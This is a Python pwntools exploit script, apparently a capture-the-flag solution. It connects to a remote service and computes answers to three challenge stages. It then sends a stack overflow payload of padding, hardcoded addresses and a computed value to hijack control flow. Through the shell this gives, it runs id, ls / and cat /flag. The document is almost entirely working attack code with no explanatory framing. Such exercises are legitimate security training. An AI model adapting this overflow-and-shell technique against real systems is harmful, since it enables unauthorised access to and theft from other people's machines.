#!/usr/bin/env python3
import sys, re, time
from pwn import remote, p64, context
context.log_level = 'error'
M = 0xffffffff
def rol7(x):
    x &= M
    return ((x << 7) | (x >> 25)) & M

host, port = sys.argv[1], int(sys.argv[2])
io = remote(host, port)
def rd(tag, t=2.0):
    r = io.recvrepeat(t)
    print('[%s] %r' % (tag, r))
    return r

d = io.recvuntil(b'A: ')
print('[A]', d)
seed = int(re.search(rb'seed\s+([0-9a-fA-F]{1,8})', d).group(1), 16)
x1 = (seed * 0x9e3779b9) & M
io.sendline(('%08x' % x1).encode())
d = io.recvuntil(b'B: ')
print('[B]', d)
x2 = rol7(x1) ^ 0x5a5a5a5a
io.sendline(('%08x' % x2).encode())
d = io.recvuntil(b'C: ')
print('[C]', d)
vals = [int(v, 16) for v in re.findall(rb'([0-9a-fA-F]{8})', d.split(b'table:')[1])]
table = vals[:16]
i1, i2 = map(int, re.search(rb'idx\s+(\d+)\s+(\d+)', d).groups())
x3 = table[i1] ^ table[i2]
io.sendline(('%08x' % x3).encode())
g_want = rol7((x2 ^ x3) ^ 0x13371337)
print('[D]', io.recvuntil(b'D> '), 'g_want=%08x' % g_want)
payload = b'A'*0x48 + p64(0x4019ad) + p64(g_want) + p64(0x4019c5)
io.send(payload)
rd('after-payload', 2.0)
for c in [b'echo HELLO123', b'id', b'ls /', b'cat /flag']:
    print('>>> sending', c)
    io.send(c + b'\n')
    rd('resp', 2.0)
io.close()
